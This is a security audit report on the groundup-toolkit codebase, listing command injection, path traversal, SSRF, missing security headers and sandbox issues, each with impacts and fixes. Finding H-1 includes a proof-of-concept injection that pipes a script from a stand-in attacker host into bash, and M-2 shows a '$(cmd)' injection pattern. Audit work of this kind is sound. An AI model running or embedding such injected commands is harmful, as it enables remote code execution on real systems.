# Security Audit Findings

**Date:** 2026-03-05
**Scope:** Full codebase — groundup-toolkit (dashboard + skills + scripts + infrastructure)
**Auditor:** Automated security audit

---

## [HIGH] H-1: Command Injection via `shell=True` in `run_gws()`

- **Location:** `lib/gws.py` lines 32-40
- **Description:** The `run_gws()` function constructs a shell command string using f-string interpolation and executes it with `subprocess.run(shell=True)`. The `resource` parameter is directly interpolated with no escaping.
- **Impact:** If any caller passes a `resource` string containing shell metacharacters, arbitrary commands execute as the process user. Currently all callers pass static strings, but this is a latent vulnerability — any future change that passes dynamic input creates an immediate RCE.
- **Proof of concept:** `run_gws("gmail; curl attacker.com/shell.sh | bash")` would execute the injected command.
- **Fix:** Rewrite to use list-based `subprocess.run` without `shell=True`:
  ```python
  cmd = ['gws-auth'] + resource.split()
  if params: cmd += ['--params', json.dumps(params)]
  if body: cmd += ['--json', json.dumps(body)]
  subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
  ```

---

## [HIGH] H-2: No HTTP Security Headers

- **Location:** `dashboard/next.config.ts`
- **Description:** No security headers are configured. Missing: `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`.
- **Impact:** Clickjacking via iframe embedding, MIME-sniffing attacks, no transport security enforcement.
- **Fix:** Add `headers()` function to `next.config.ts` with all standard security headers.

---

## [HIGH] H-3: Path Traversal in Export Module

- **Location:** `exports/deal-analyzer/deal_analyzer.py` lines 159-193
- **Description:** The `_read_local_file()` function reads any file path on the filesystem with zero restrictions. No `ALLOWED_LOCAL_DIRS` allowlist (unlike the skills version which has one).
- **Impact:** Anyone using the standalone export module can read arbitrary files: `/etc/shadow`, `~/.env`, etc.
- **Fix:** Add `ALLOWED_LOCAL_DIRS` allowlist and `os.path.realpath()` validation, matching the pattern in `skills/deal-analyzer/analyzer.py`.

---

## [HIGH] H-4: No SSRF Protection in Export Module

- **Location:** `exports/deal-analyzer/deal_analyzer.py` lines 149-173
- **Description:** `fetch_deck_content()` calls `requests.get()` on any URL with `allow_redirects=True`, no domain allowlist, no private IP check.
- **Impact:** Cloud metadata exfiltration (`http://169.254.169.254/`), internal network scanning, reading localhost services.
- **Fix:** Integrate `safe_url.py` SSRF protection or add a domain allowlist.

---

## [HIGH] H-5: `next-auth` Beta in Production

- **Location:** `dashboard/package.json` line 18
- **Description:** Uses `"next-auth": "^5.0.0-beta.30"` — a pre-release version with caret range, meaning untested beta updates auto-install.
- **Impact:** Beta versions may contain undiscovered security vulnerabilities and breaking changes.
- **Fix:** Pin to exact version: `"next-auth": "5.0.0-beta.30"` or upgrade to stable v5 GA.

---

## [HIGH] H-6: LinkedIn Browser Runs as Root Without Sandbox

- **Location:** `services/linkedin-browser.service` line 7
- **Description:** Chromium runs as `root` with `--no-sandbox`. If the browser is compromised via a malicious page, the attacker gains full root access.
- **Impact:** Full server compromise via browser exploit chain.
- **Fix:** Create a dedicated unprivileged user and add `User=linkedin-browser` to the service file.

---

## [HIGH] H-7: Chrome DevTools Protocol Port Exposure Risk

- **Location:** `services/linkedin-browser.service` line 7
- **Description:** `--remote-debugging-port=18801` exposes CDP. If this port is accessible from the network (not just localhost), anyone can control the browser.
- **Impact:** Full browser takeover — read cookies, navigate to any URL, execute JavaScript.
- **Fix:** Add `--remote-debugging-address=127.0.0.1` explicitly and verify with `ufw`.

---

## [MEDIUM] M-1: API Routes Lack Explicit Auth Checks

- **Location:** `dashboard/app/api/chat/route.ts` line 33, `dashboard/app/api/services/route.ts` lines 4, 8
- **Description:** Both routes rely entirely on middleware for auth. No explicit `auth()` call in handlers.
- **Impact:** If middleware matcher is changed or bypassed, routes become unprotected.
- **Fix:** Add `const session = await auth(); if (!session) return Response("Unauthorized", { status: 401 })` in each handler.

---

## [MEDIUM] M-2: `shell=True` in `_gws_send_simple()`

- **Location:** `lib/gws.py` lines 180-182
- **Description:** Email `to` parameter placed in single quotes but not escaped. Shell metacharacter injection possible.
- **Impact:** Command injection if email address contains `'$(cmd)'` patterns.
- **Fix:** Use `shlex.quote()` for all parameters or rewrite with list-based subprocess.

---

## [MEDIUM] M-3: No Input Validation on `/api/chat`

- **Location:** `dashboard/app/api/chat/route.ts` line 34
- **Description:** `req.json()` parsed without try/catch, no type validation on `message`/`context`, no length limits.
- **Impact:** Malformed JSON crashes the handler; unbounded input causes memory exhaustion.
- **Fix:** Add type checking, length validation, and error handling.

---

## [MEDIUM] M-4: No Rate Limiting on API Endpoints

- **Location:** `dashboard/app/api/chat/route.ts`, `dashboard/app/api/services/route.ts`
- **Description:** No rate limiting on any endpoint.
- **Impact:** API abuse, potential DoS.
- **Fix:** Add rate limiting middleware or use Vercel/proxy-level rate limits.

---

## [MEDIUM] M-5: No Request Body Size Limits

- **Location:** `dashboard/app/api/chat/route.ts` line 34
- **Description:** No body size validation. Extremely large payloads accepted.
- **Impact:** Memory exhaustion, DoS.
- **Fix:** Validate `message.length` before processing.

---

## [MEDIUM] M-6: DNS Rebinding TOCTOU in SSRF Protection

- **Location:** `lib/safe_url.py` lines 46-79
- **Description:** DNS resolution happens in `is_safe_url()`, then a separate HTTP request follows. DNS record could change between the two.
- **Impact:** Bypass SSRF protection to access internal services. Requires attacker to control DNS for an allowed domain's subdomain.
- **Fix:** Pin resolved IP and force the HTTP request to use that specific IP.

---

## [MEDIUM] M-7: Floating Version Ranges on Dependencies

- **Location:** `dashboard/package.json`
- **Description:** Most dependencies use `^` ranges, allowing automatic minor/patch updates.
- **Impact:** Supply chain risk — compromised package update installed automatically.
- **Fix:** Pin security-critical packages to exact versions.

---

## [MEDIUM] M-8: Root `.gitignore` May Hide `package-lock.json`

- **Location:** `.gitignore` line 15
- **Description:** Root `.gitignore` has `package-lock.json` which could prevent the dashboard lock file from being tracked.
- **Impact:** Non-reproducible builds, supply chain risk.
- **Fix:** Change to `/package-lock.json` (root-only) so dashboard lock file is always tracked.

---

## [MEDIUM] M-9: Hardcoded Email in `gws.py`

- **Location:** `lib/gws.py` line 385
- **Description:** `christina@groundup.vc` hardcoded instead of using `config.assistant_email`.
- **Impact:** Toolkit not portable; silently fails for other deployments.
- **Fix:** Replace with `config.assistant_email`.

---

## [LOW] L-1: No Session Invalidation on Logout (JWT)

- **Location:** `dashboard/lib/auth.ts`
- **Description:** JWT-based sessions are stateless. A stolen JWT remains valid until expiry (30 days).
- **Fix:** Acceptable for internal tool; switch to DB sessions if higher security needed.

---

## [LOW] L-2: `configPath` Passed to Shell via `execSync`

- **Location:** `lib/config.js` lines 58-60
- **Description:** Config file path interpolated into shell command string.
- **Fix:** Use `execFileSync` with argument list instead.

---

## [LOW] L-3: CSRF Relies on NextAuth Defaults Only

- **Location:** `dashboard/lib/auth.ts`
- **Description:** No explicit CSRF token validation on state-changing routes.
- **Fix:** Acceptable with JWT + SameSite cookies; add custom header check for defense-in-depth.

---

## [LOW] L-4: Python Error Logging May Expose Sensitive Data

- **Location:** Multiple files in `lib/`, `skills/`, `scripts/`
- **Description:** Exception objects printed via `f"error: {e}"` — may include URLs with tokens.
- **Fix:** Create sanitized logging utility that strips credentials from error messages.

---

## [LOW] L-5: Data Directories Created Without Restrictive Permissions

- **Location:** `skills/founder-scout/scout.py:55`, `skills/meeting-reminders/reminders.py:45`, `skills/keep-on-radar/radar.py:55`
- **Description:** `os.makedirs()` called without `mode=0o700`, defaults to world-readable.
- **Fix:** Add `mode=0o700` to all data directory creation calls.

---

## [LOW] L-6: Cookie Security Relies on NextAuth Defaults

- **Location:** `dashboard/lib/auth.ts`
- **Description:** No explicit `Secure: true` on session cookies.
- **Fix:** Add explicit cookie options in NextAuth config.

---

## [LOW] L-7: Hardcoded HubSpot Stage ID

- **Location:** `skills/keep-on-radar/radar.py` line 48
- **Description:** Stage ID `"1138024523"` hardcoded instead of in config.
- **Fix:** Move to `config.yaml`.

---

## [LOW] L-8: User Message Echoed Without Length Limit

- **Location:** `dashboard/app/api/chat/route.ts` line 83
- **Description:** Full user message reflected in response without truncation.
- **Fix:** Truncate to reasonable length before echoing.

---

## [LOW] L-9: Output File Path From Unsanitized Company Name

- **Location:** `exports/deal-analyzer/example.py` lines 63-67
- **Description:** Company name from AI extraction used in output filename with minimal sanitization.
- **Fix:** Use thorough sanitization: `re.sub(r'[^\w.-]', '_', name)`.

---

## [INFO] I-1: No Hardcoded API Keys or Tokens in Git

All secrets properly loaded from environment variables. `.env` is gitignored. Git history is clean.

## [INFO] I-2: SQL Queries All Parameterized

All SQLite queries use `?` placeholders. No SQL injection risk.

## [INFO] I-3: No `dangerouslySetInnerHTML` in React

React auto-escaping in use throughout. No raw HTML injection risk.

## [INFO] I-4: OAuth State/CSRF Handled by NextAuth

NextAuth automatically validates OAuth state parameter and uses PKCE. CSRF protection is present.

## [INFO] I-5: SSRF Protection in Skills Module is Solid

`lib/safe_url.py` has domain allowlist + DNS rebinding protection + redirect validation. The skills-level implementation is well done.
